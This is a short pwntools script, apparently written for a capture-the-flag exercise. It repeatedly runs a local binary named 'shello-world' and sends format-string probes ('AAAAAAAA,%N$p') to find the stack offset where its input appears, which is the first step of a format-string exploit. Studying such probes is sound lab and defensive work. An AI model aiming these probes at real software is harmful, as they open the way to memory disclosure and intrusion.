from pwn import *

elf = context.binary = ELF('./shello-world')
context.log_level = 'error'


for i in range(1,50):
        p = process()
        payload = 'AAAAAAAA,%{i}$p'.format(i=i)
        p.sendline(payload)
        print(p.recvall(), i)

